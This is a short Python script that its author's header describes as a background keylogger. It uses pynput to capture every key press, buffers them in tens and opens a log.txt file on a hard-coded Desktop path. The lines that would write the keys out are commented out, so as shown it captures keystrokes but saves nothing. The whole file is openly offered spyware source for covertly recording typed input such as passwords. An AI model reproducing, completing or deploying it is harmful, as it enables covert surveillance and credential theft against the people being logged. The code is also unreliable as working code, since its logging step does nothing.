# Script created by Chiriac Adrian Stefan (chr.adrian@yahoo.com)
# Brief : script to log they keystrokes as a background application


from pynput.keyboard import Key, Listener
import os


count = 0
keys = []


def key_press(key):
    global count, keys

    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    os.chdir(r"C:\Users\Me\Desktop")
    with open("log.txt", "a") as f:
        nr_of_keys = 0
        for key in keys:
            k = str(key).replace("'", "")
            nr_of_keys += 1
            # if nr_of_keys == 50:
            #     f.write("\n")
            #     nr_of_keys = 0
            # elif k.find("Key") == -1:
            #     f.write(k)


def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()